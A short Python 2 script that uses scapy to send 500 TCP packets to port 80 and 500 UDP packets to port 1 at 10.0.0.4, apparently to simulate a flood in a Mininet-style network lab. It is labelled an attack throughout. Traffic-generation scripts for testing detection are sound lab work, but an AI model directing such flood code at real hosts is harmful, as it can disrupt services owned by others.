#!/usr/bin/env python

from scapy.all import *

def main():
	print "Attack start...\n"

	print "TCP attack...\n"
	for i in xrange(500):
		src = "10.0.0.1"
		p = Ether(dst="00:00:00:00:00:04") / IP(dst="10.0.0.4", src=src) / TCP(dport=80) / "attack"
		sendp(p, iface="s1-eth1")
	print "\nTCP attack stop.\n"

	print "\nUDP attack...\n"
	for i in xrange(500):
		src = "10.0.0.1"
		p = Ether(dst="00:00:00:00:00:04") / IP(dst="10.0.0.4", src=src) / UDP(dport=1)
		sendp(p, iface="s1-eth1")
	print "\nUDP attack stop.\n"

	print "Attack finished, happy hacking!"

if __name__ == '__main__':
	main()
